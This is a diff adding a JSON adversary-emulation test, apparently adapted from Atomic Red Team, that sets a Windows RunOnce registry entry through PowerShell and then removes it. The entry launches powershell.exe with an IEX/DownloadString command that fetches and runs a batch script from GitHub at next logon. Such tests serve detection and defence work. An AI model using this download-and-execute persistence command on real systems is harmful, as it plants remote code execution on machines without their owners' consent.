@@ -1,0 +1,58 @@
+{
+  "id": "eb44f842-0457-4ddc-9b92-c4caa144ac42",
+  "name": "PowerShell Registry RunOnce",
+  "description": "RunOnce Key Persistence via PowerShell\nUpon successful execution, a new entry will be added to the runonce item in the registry.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "fe3e1282-33a2-4015-90c3-a4d2a6f8190a",
+      "type": "execute-command",
+      "data": {
+        "command": "$RunOnceKey = \"#{reg_key_path}\"\nset-itemproperty $RunOnceKey \"NextRun\" '#{thing_to_execute} \"IEX (New-Object Net.WebClient).DownloadString(`\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\")\"'\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "5c264277-b7c2-4206-8c91-9c18b17f08c2",
+      "type": "execute-command",
+      "data": {
+        "command": "Remove-ItemProperty -Path #{reg_key_path} -Name \"NextRun\" -Force -ErrorAction Ignore\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "fe3e1282-33a2-4015-90c3-a4d2a6f8190a",
+      "p": "on-success",
+      "o": "5c264277-b7c2-4206-8c91-9c18b17f08c2"
+    },
+    {
+      "s": "fe3e1282-33a2-4015-90c3-a4d2a6f8190a",
+      "p": "on-failure",
+      "o": "5c264277-b7c2-4206-8c91-9c18b17f08c2"
+    }
+  ],
+  "tags": [
+    "T1547.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "thing_to_execute",
+      "type": "path",
+      "description": "Thing to Run",
+      "value": "powershell.exe"
+    },
+    {
+      "name": "reg_key_path",
+      "type": "path",
+      "description": "Path to registry key to update",
+      "value": "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
+    }
+  ]
+}
